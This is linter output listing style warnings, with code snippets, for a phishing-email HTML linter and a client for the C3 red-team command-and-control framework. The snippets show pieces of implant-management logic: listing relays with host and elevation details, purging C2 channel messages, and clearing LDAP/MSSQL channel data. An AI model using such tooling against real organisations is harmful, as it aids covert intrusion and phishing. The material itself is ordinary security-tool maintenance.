1360 |                     continue
1361 |
1362 |                 totalChecked += 1
     |                 ^^^^^^^^^^^^
1363 |                 if re.search(r"\b" + re.escape(word) + r"\b", text, re.I):
1364 |                     found.add(word.lower())
     |

N806 Variable `N` in function should be lowercase
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1371:25
     |
1369 |                     if pos != -1:
1370 |                         line = ""
1371 |                         N = 50
     |                         ^
1372 |                         if pos > N:
1373 |                             line = text[pos - N : pos]
     |

N806 Variable `totalFound` in function should be lowercase
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1389:17
     |
1388 | ΓÇª     if len(found) > 0:
1389 | ΓÇª         totalFound += len(found)
     |           ^^^^^^^^^^
1390 | ΓÇª         result += f'- Found {logger.colored(len(found), "red")} {logger.colored(title, "yellow")} words {logger.colored(words[0], ΓÇª
     |

F841 Local variable `embed` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1411:9
     |
1409 |         result = ""
1410 |         num = 0
1411 |         embed = ""
     |         ^^^^^
1412 |
1413 |         for link in links:
     |
help: Remove assignment to unused variable `embed`

N806 Variable `N` in function should be lowercase
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1428:21
     |
1427 |                 if num < 5:
1428 |                     N = 70
     |                     ^
1429 |                     tmp = text[:N]
     |

F841 Local variable `embed` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1459:9
     |
1457 |         result = ""
1458 |         num = 0
1459 |         embed = ""
     |         ^^^^^
1460 |
1461 |         for link in links:
     |
help: Remove assignment to unused variable `embed`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1464:13
     |
1462 |             try:
1463 |                 href = link["href"]
1464 |             except:
     |             ^^^^^^
1465 |                 continue
     |

F841 Local variable `text` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1467:13
     |
1465 |                 continue
1466 |
1467 |             text = link.getText().replace("\n", "").strip()
     |             ^^^^
1468 |             params = dict(parse.parse_qsl(parse.urlsplit(href).query))
     |
help: Remove assignment to unused variable `text`

F811 Redefinition of unused `testLinksWithGETParams` from line 1452
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1496:9
     |
1494 |         return {"description": desc, "context": context, "analysis": result}
1495 |
1496 |     def testLinksWithGETParams(self):
     |         ^^^^^^^^^^^^^^^^^^^^^^ `testLinksWithGETParams` redefined here
1497 |         links = self.soup("a")
     |
    ::: security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1452:9
     |
1450 |         return {"description": desc, "context": context, "analysis": result}
1451 |
1452 |     def testLinksWithGETParams(self):
     |         ---------------------- previous definition of `testLinksWithGETParams` here
1453 |         links = self.soup("a")
     |
help: Remove definition: `testLinksWithGETParams`

F841 Local variable `embed` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1503:9
     |
1501 |         result = ""
1502 |         num = 0
1503 |         embed = ""
     |         ^^^^^
1504 |
1505 |         for link in links:
     |
help: Remove assignment to unused variable `embed`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1508:13
     |
1506 |             try:
1507 |                 href = link["href"]
1508 |             except:
     |             ^^^^^^
1509 |                 continue
     |

F841 Local variable `text` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1511:13
     |
1509 |                 continue
1510 |
1511 |             text = link.getText().replace("\n", "").strip()
     |             ^^^^
1512 |             params = dict(parse.parse_qsl(parse.urlsplit(href).query))
     |
help: Remove assignment to unused variable `text`

F841 Local variable `embed` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1548:9
     |
1546 |         result = ""
1547 |         num = 0
1548 |         embed = ""
     |         ^^^^^
1549 |
1550 |         for link in links:
     |
help: Remove assignment to unused variable `embed`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1553:13
     |
1551 |             try:
1552 |                 href = link["href"]
1553 |             except:
     |             ^^^^^^
1554 |                 continue
     |

F841 Local variable `embed` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1605:9
     |
1603 |         result = ""
1604 |         num = 0
1605 |         embed = ""
     |         ^^^^^
1606 |
1607 |         for link in links:
     |
help: Remove assignment to unused variable `embed`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1610:13
     |
1608 |             try:
1609 |                 href = link["href"]
1610 |             except:
     |             ^^^^^^
1611 |                 continue
     |

B007 Loop control variable `k` not used within loop body
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1621:21
     |
1620 |             if len(params) > 0:
1621 |                 for k, v in params.items():
     |                     ^
1622 |                     m = url.match(v)
     |
help: Rename unused `k` to `_k`

F841 Local variable `urlmatched` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1625:25
     |
1624 |                     if m:
1625 |                         urlmatched = m.group(1)
     |                         ^^^^^^^^^^
1626 |                         num += 1
     |
help: Remove assignment to unused variable `urlmatched`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1637:33
     |
1635 | ΓÇª                     context += f'\ttext = "{text[:90]}"\n\n'
1636 | ΓÇª                     context += (
1637 | ΓÇª                         f"\thref URL GET parameter contained another URL:\n\t\t"
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1638 | ΓÇª                         + logger.colored(v, "red")
1639 | ΓÇª                         + "\n"
     |
help: Remove extraneous `f` prefix

F841 Local variable `embed` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1658:9
     |
1656 |         result = ""
1657 |         num = 0
1658 |         embed = ""
     |         ^^^^^
1659 |
1660 |         for link in links:
     |
help: Remove assignment to unused variable `embed`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1663:13
     |
1661 |             try:
1662 |                 href = link["href"]
1663 |             except:
     |             ^^^^^^
1664 |                 continue
     |

F841 Local variable `embed` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1702:9
     |
1700 |         result = ""
1701 |         num = 0
1702 |         embed = ""
     |         ^^^^^
1703 |
1704 |         for img in images:
     |
help: Remove assignment to unused variable `embed`

F841 Local variable `src` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1705:13
     |
1704 |         for img in images:
1705 |             src = img["src"]
     |             ^^^
1706 |             alt = ""
     |
help: Remove assignment to unused variable `src`

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1710:13
     |
1708 |             try:
1709 |                 alt = img["alt"]
1710 |             except:
     |             ^^^^^^
1711 |                 pass
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1744:13
     |
1742 |             try:
1743 |                 alt = img["alt"]
1744 |             except:
     |             ^^^^^^
1745 |                 pass
     |

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1783:16
     |
1781 | ΓÇªgs = self.soup.find_all()
1782 | ΓÇª
1783 | ΓÇªsc = f"Mail clients are using HTML rendering engines which might not support certain HTML tags (they strip them for security reasons)."
     |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1784 | ΓÇªntext = ""
1785 | ΓÇªsult = ""
     |
help: Remove extraneous `f` prefix

F841 Local variable `embed` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1787:9
     |
1785 |         result = ""
1786 |         num = 0
1787 |         embed = ""
     |         ^^^^^
1788 |         found = set()
     |
help: Remove assignment to unused variable `embed`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1826:16
     |
1824 | ΓÇªgs = self.soup.find_all()
1825 | ΓÇª
1826 | ΓÇªsc = f"Mail clients are using HTML rendering engines which might not support certain HTML attributes on specific tags (they strip them for security reasons)."
     |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1827 | ΓÇªntext = ""
1828 | ΓÇªsult = ""
     |
help: Remove extraneous `f` prefix

F841 Local variable `embed` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1830:9
     |
1828 |         result = ""
1829 |         num = 0
1830 |         embed = ""
     |         ^^^^^
1831 |         found = set()
     |
help: Remove assignment to unused variable `embed`

B007 Loop control variable `v` not used within loop body
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1838:24
     |
1836 |                 in PhishingMailParser.SupportedHTMLTagsAndRelatedAttribs
1837 |             ):
1838 |                 for k, v in tag.attrs.items():
     |                        ^
1839 |                     if (
1840 |                         k.lower()
     |
help: Rename unused `v` to `_v`

F841 Local variable `width` is assigned to but never used
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1878:9
     |
1876 | def printOutput(out):
1877 |     if options["format"] == "text":
1878 |         width = 100
     |         ^^^^^
1879 |         num = 0
     |
help: Remove assignment to unused variable `width`

SIM113 Use `enumerate()` for index variable `num` in `for` loop
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1882:13
     |
1881 |         for k, v in out.items():
1882 |             num += 1
     |             ^^^^^^^^
1883 |             analysis = v["analysis"].strip()
1884 |             context = v["context"].strip()
     |

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1901:41
     |
1899 | ({num}) Test: {logger.colored(k, "cyan")}
1900 |
1901 | {logger.colored("DESCRIPTION", "blue")}: 
     |                                         ^
1902 |
1903 |     {desc}
     |
help: Remove trailing whitespace

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1905:37
     |
1903 |     {desc}
1904 |
1905 | {logger.colored("CONTEXT", "blue")}: 
     |                                     ^
1906 |
1907 |     {context}
     |
help: Remove trailing whitespace

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1909:38
     |
1907 |     {context}
1908 |
1909 | {logger.colored("ANALYSIS", "blue")}: 
     |                                      ^
1910 |
1911 |     {analysis}
     |
help: Remove trailing whitespace

N816 Variable `serverValidated` in global scope should not be mixedCase
  --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:30:1
   |
28 | commands = {"list": ["gateways", "relays"], "get": ["gateway", "relay"]}
29 |
30 | serverValidated = False
   | ^^^^^^^^^^^^^^^
31 |
32 | # BackendCommons.h: enum class Command : std::uint16_t
   |

N816 Variable `commandsMap` in global scope should not be mixedCase
  --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:33:1
   |
32 | # BackendCommons.h: enum class Command : std::uint16_t
33 | commandsMap = {
   | ^^^^^^^^^^^
34 |     "AddDevice": 0,
35 |     "Close": 2**16 - 1,
   |

N803 Argument name `rawResp` should be lowercase
  --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:90:21
   |
90 | def getRequest(url, rawResp=False, stream=False):
   |                     ^^^^^^^^^^^^^
91 |     global serverValidated
   |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:120:13
    |
119 |                 serverValidated = True
120 |             except:
    |             ^^^^^^
121 |                 Logger.fatal(
122 |                     "Server could not be validated. Are you sure your Host value points to a valid C3 webcontroller URL?"
    |

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:125:50
    |
123 |                 )
124 |
125 |     except requests.exceptions.ConnectTimeout as e:
    |                                                  ^
126 |         Logger.fatal(f'Connection with {config["host"]} timed-out.')
127 |     except Exception as e:
    |
help: Remove assignment to unused variable `e`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:137:5
    |
135 |     try:
136 |         ret = resp.json()
137 |     except:
    |     ^^^^^^
138 |         ret = resp.text
    |

N803 Argument name `contentType` should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:143:33
    |
143 | def postRequest(url, data=None, contentType="application/json", rawResp=False):
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
144 |     auth = None
145 |     if config["httpauth"]:
    |

N803 Argument name `rawResp` should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:143:65
    |
143 | def postRequest(url, data=None, contentType="application/json", rawResp=False):
    |                                                                 ^^^^^^^^^^^^^
144 |     auth = None
145 |     if config["httpauth"]:
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:178:5
    |
176 |     try:
177 |         ret = resp.json()
178 |     except:
    |     ^^^^^^
179 |         ret = resp.text
    |

N803 Argument name `gatewayId` should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:184:22
    |
184 | def printFullGateway(gatewayId):
    |                      ^^^^^^^^^
185 |     gateway = getRequest(f"/api/gateway/{gatewayId}")
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:187:8
    |
185 |     gateway = getRequest(f"/api/gateway/{gatewayId}")
186 |
187 |     if type(gateway) == str and re.match(
    |        ^^^^^^^^^^^^^^^^^^^^
188 |         r"Gateway with id = \w+ not found", gateway, re.I
189 |     ):
    |

SIM113 Use `enumerate()` for index variable `cnum` in `for` loop
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:207:13
    |
205 |         cnum = 0
206 |         for c in gateway["connectors"]:
207 |             cnum += 1
    |             ^^^^^^^^^
208 |             addr = ""
209 |             port = ""
    |

SIM113 Use `enumerate()` for index variable `num` in `for` loop
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:223:13
    |
221 |         print(f"{indent}Channels:")
222 |         for c in gateway["channels"]:
223 |             num += 1
    |             ^^^^^^^^
224 |             kind = "Channel"
225 |             name = ""  # todo
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:227:16
    |
225 |             name = ""  # todo
226 |
227 |             if "isNegotiationChannel" in c.keys() and c["isNegotiationChannel"]:
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
228 |                 kind = "Negotiation Channel"
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:230:16
    |
228 |                 kind = "Negotiation Channel"
229 |
230 |             if "isReturnChannel" in c.keys() and c["isReturnChannel"]:
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
231 |                 kind = "Gateway Return Channel (GRC)"
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:240:20
    |
239 |             for arg in c["propertiesText"]["arguments"]:
240 |                 if type(arg) == list or type(arg) == tuple:
    |                    ^^^^^^^^^^^^^^^^^
241 |                     for arg1 in arg:
242 |                         print(
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:240:41
    |
239 |             for arg in c["propertiesText"]["arguments"]:
240 |                 if type(arg) == list or type(arg) == tuple:
    |                                         ^^^^^^^^^^^^^^^^^^
241 |                     for arg1 in arg:
242 |                         print(
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:273:23
    |
271 | {indent}    Is active:        {g['isActive']}{alive}
272 | {indent}    Timestamp:        {datetime.fromtimestamp(g['timestamp'])}
273 | {indent}    Host Info:  
    |                       ^^
274 | {indent}        Computer:     {g['hostInfo']['computerName']}
275 | {indent}        Domain:       {g['hostInfo']['domain']}
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:310:23
    |
308 | {indent}    Is active:        {r['isActive']}{alive}
309 | {indent}    Timestamp:        {datetime.fromtimestamp(r['timestamp'])}
310 | {indent}    Host Info:  
    |                       ^^
311 | {indent}        Computer:     {r['hostInfo']['computerName']}
312 | {indent}        Domain:       {r['hostInfo']['domain']}
    |
help: Remove trailing whitespace

SIM113 Use `enumerate()` for index variable `cnum` in `for` loop
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:323:9
    |
321 |     print(f"{indent}Channels:")
322 |     for c in r["channels"]:
323 |         cnum += 1
    |         ^^^^^^^^^
324 |         kind = "Channel"
325 |         name = ""  # todo
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:327:12
    |
325 |         name = ""  # todo
326 |
327 |         if "isNegotiationChannel" in c.keys() and c["isNegotiationChannel"]:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
328 |             kind = "Negotiation Channel"
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:330:12
    |
328 |             kind = "Negotiation Channel"
329 |
330 |         if "isReturnChannel" in c.keys() and c["isReturnChannel"]:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
331 |             kind = "Gateway Return Channel (GRC)"
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:340:16
    |
339 |         for arg in c["propertiesText"]["arguments"]:
340 |             if type(arg) == list or type(arg) == tuple:
    |                ^^^^^^^^^^^^^^^^^
341 |                 for arg1 in arg:
342 |                     print(
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:340:37
    |
339 |         for arg in c["propertiesText"]["arguments"]:
340 |             if type(arg) == list or type(arg) == tuple:
    |                                     ^^^^^^^^^^^^^^^^^^
341 |                 for arg1 in arg:
342 |                     print(
    |

B007 Loop control variable `gateway` not used within loop body
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:368:13
    |
366 |     num = 0
367 |     if config["format"] == "text":
368 |         for gateway, relay in relays:
    |             ^^^^^^^
369 |             num += 1
370 |             printFullRelay(relay, num)
    |
help: Rename unused `gateway` to `_gateway`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:401:13
    |
399 |           for g in gateways:
400 |               num += 1
401 | /             if args.active:
402 | |                 if not g["isActive"]:
    | |_____________________________________^
403 |                       continue
    |
help: Combine `if` statements using `and`

N803 Argument name `gatewayId` should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:408:23
    |
408 | def listGatewayRelays(gatewayId, indent="", onlyActive=False):
    |                       ^^^^^^^^^
409 |     relays = getRequest(f"/api/gateway/{gatewayId}")
    |

N803 Argument name `onlyActive` should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:408:45
    |
408 | def listGatewayRelays(gatewayId, indent="", onlyActive=False):
    |                                             ^^^^^^^^^^^^^^^^
409 |     relays = getRequest(f"/api/gateway/{gatewayId}")
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:411:8
    |
409 |     relays = getRequest(f"/api/gateway/{gatewayId}")
410 |
411 |     if type(relays) == str and re.match(
    |        ^^^^^^^^^^^^^^^^^^^
412 |         r"Gateway with id = \w+ not found", relays, re.I
413 |     ):
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:429:13
    |
427 |               elevated = ""
428 |
429 | /             if onlyActive:
430 | |                 if not g["isActive"]:
    | |_____________________________________^
431 |                       continue
    |
help: Combine `if` statements using `and`

F841 Local variable `elevated` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:437:17
    |
436 |             if g["hostInfo"]["isElevated"]:
437 |                 elevated = "\t\t\t(###)"
    |                 ^^^^^^^^
438 |
439 |             print(
    |
help: Remove assignment to unused variable `elevated`

W291 Trailing whitespace
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:446:23
    |
444 | {indent}    Is active:  {g['isActive']}{alive}
445 | {indent}    Timestamp:  {datetime.fromtimestamp(g['timestamp'])}
446 | {indent}    Host Info:  
    |                       ^^
447 | {indent}        Computer:     {g['hostInfo']['computerName']}
448 | {indent}        Domain:       {g['hostInfo']['domain']}
    |
help: Remove trailing whitespace

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:459:27
    |
457 |     Logger.dbg("in onListRelays(): ")
458 |
459 |     if args.gateway_id != None:
    |                           ^^^^
460 |         gateways = getRequest("/api/gateway")
461 |         for g in gateways:
    |
help: Replace with `cond is not None`

SIM113 Use `enumerate()` for index variable `num` in `for` loop
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:475:13
    |
473 |         relays["gateways"] = []
474 |         for g in gateways:
475 |             num += 1
    |             ^^^^^^^^
476 |             if config["format"] == "text":
477 |                 print(
    |

N806 Variable `relaysData` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:483:17
    |
481 |                 listGatewayRelays(g["agentId"], indent="    ", onlyActive=args.active)
482 |             else:
483 |                 relaysData = getRequest(f'/api/gateway/{g["agentId"]}')
    |                 ^^^^^^^^^^
484 |                 g["relays"] = relaysData["relays"]
485 |                 relays["gateways"].append(g)
    |

N803 Argument name `nonFatal` should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:491:25
    |
491 | def collectRelays(args, nonFatal=False):
    |                         ^^^^^^^^^^^^^^
492 |     relays = []
493 |     gateways = getRequest("/api/gateway")
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:506:9
    |
505 |       for _gateway in gateways:
506 | /         if len(gateway_id) > 0:
507 | |             if (
508 | |                 _gateway["agentId"].lower() != gateway_id.lower()
509 | |                 and _gateway["name"].lower() != gateway_id.lower()
510 | |             ):
    | |______________^
511 |                   continue
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:516:13
    |
515 |           for relay in gateway["relays"]:
516 | /             if len(relay_id) > 0:
517 | |                 if (
518 | |                     relay["agentId"].lower() != relay_id.lower()
519 | |                     and relay["name"].lower() != relay_id.lower()
520 | |                 ):
    | |__________________^
521 |                       continue
    |
help: Combine `if` statements using `and`

N806 Variable `commandIds` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:536:5
    |
534 |     caps = getRequest(f'/api/gateway/{gateway["agentId"]}/capability')
535 |
536 |     commandIds = {}
    |     ^^^^^^^^^^
537 |     channels = {}
538 |     peripherals = {}
    |

N806 Variable `gatewayVal` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:540:9
    |
538 |     peripherals = {}
539 |
540 |     for gatewayVal in caps["gateway"]:
    |         ^^^^^^^^^^
541 |         for commandVal in gatewayVal["commands"]:
542 |             commandIds[commandVal["name"].lower()] = commandVal["id"]
    |

N806 Variable `commandVal` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:541:13
    |
540 |     for gatewayVal in caps["gateway"]:
541 |         for commandVal in gatewayVal["commands"]:
    |             ^^^^^^^^^^
542 |             commandIds[commandVal["name"].lower()] = commandVal["id"]
    |

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:587:33
    |
585 |             print("[.] Pinging only once...")
586 |             _onPing(args)
587 |     except KeyboardInterrupt as e:
    |                                 ^
588 |         print("[.] User stopped Pinging process.")
    |
help: Remove assignment to unused variable `e`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:616:13
    |
615 |         if (
616 |             type(ret) == dict
    |             ^^^^^^^^^^^^^^^^^
617 |             and "relayAgentId" in ret.keys()
618 |             and ret["relayAgentId"] == relay["agentId"]
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:617:17
    |
615 |         if (
616 |             type(ret) == dict
617 |             and "relayAgentId" in ret.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
618 |             and ret["relayAgentId"] == relay["agentId"]
619 |         ):
    |
help: Remove `.keys()`

N806 Variable `lastId` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:632:5
    |
631 | def getLastGatewayCommandID():
632 |     lastId = 0
    |     ^^^^^^
633 |     gateways = getRequest(f"/api/gateway")
    |

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:633:27
    |
631 | def getLastGatewayCommandID():
632 |     lastId = 0
633 |     gateways = getRequest(f"/api/gateway")
    |                           ^^^^^^^^^^^^^^^
634 |
635 |     for gateway in gateways:
    |
help: Remove extraneous `f` prefix

N806 Variable `lastId` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:639:17
    |
637 |         for comm in commands:
638 |             if comm["id"] > lastId:
639 |                 lastId = comm["id"]
    |                 ^^^^^^
640 |
641 |     return lastId + 1
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:680:12
    |
678 |         ret = postRequest(channel["url"], data)
679 |
680 |         if type(ret) == dict and "Clear all" in str(ret):
    |            ^^^^^^^^^^^^^^^^^
681 |             if "relay" in channel.keys():
682 |                 print(
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:681:16
    |
680 | ΓÇª     if type(ret) == dict and "Clear all" in str(ret):
681 | ΓÇª         if "relay" in channel.keys():
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^
682 | ΓÇª             print(
683 | ΓÇª                 f'[+] Purged all messages from Mattermost C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on ΓÇª
    |
help: Remove `.keys()`

N806 Variable `channelsToUpdate` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:694:5
    |
692 |     gateways = getRequest("/api/gateway")
693 |
694 |     channelsToUpdate = []
    |     ^^^^^^^^^^^^^^^^
695 |
696 |     for _gateway in gateways:
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:697:9
    |
696 |       for _gateway in gateways:
697 | /         if len(args.gateway_id) > 0:
698 | |             if (
699 | |                 _gateway["agentId"].lower() != args.gateway_id.lower()
700 | |                 and _gateway["name"].lower() != args.gateway_id.lower()
701 | |             ):
    | |______________^
702 |                   continue
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:727:13
    |
726 |           for relay in gateway["relays"]:
727 | /             if len(args.relay_id) > 0:
728 | |                 if (
729 | |                     relay["agentId"].lower() != args.relay_id.lower()
730 | |                     and relay["name"].lower() != args.relay_id.lower()
731 | |                 ):
    | |__________________^
732 |                       continue
    |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:802:12
    |
800 |         ret = postRequest(channel["url"], data)
801 |
802 |         if type(ret) == dict and "LDAP" in str(ret):
    |            ^^^^^^^^^^^^^^^^^
803 |             if "relay" in channel.keys():
804 |                 print(
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:803:16
    |
802 | ΓÇª     if type(ret) == dict and "LDAP" in str(ret):
803 | ΓÇª         if "relay" in channel.keys():
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^
804 | ΓÇª             print(
805 | ΓÇª                 f'[+] Cleared LDAP attribute value on C3 channel {channel["channelId"]} on Relay {channel["relay"]["name"]} on gateΓÇª
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:833:12
    |
831 |         ret = postRequest(channel["url"], data)
832 |
833 |         if type(ret) == dict and "MSSQL" in str(ret):
    |            ^^^^^^^^^^^^^^^^^
834 |             if "relay" in channel.keys():
835 |                 print(
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\C3-Client\c3-client.py:834:16
    |
833 | ΓÇª     if type(ret) == dict and "MSSQL" in str(ret):
834 | ΓÇª         if "relay" in channel.keys():
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^
835 | ΓÇª             print(
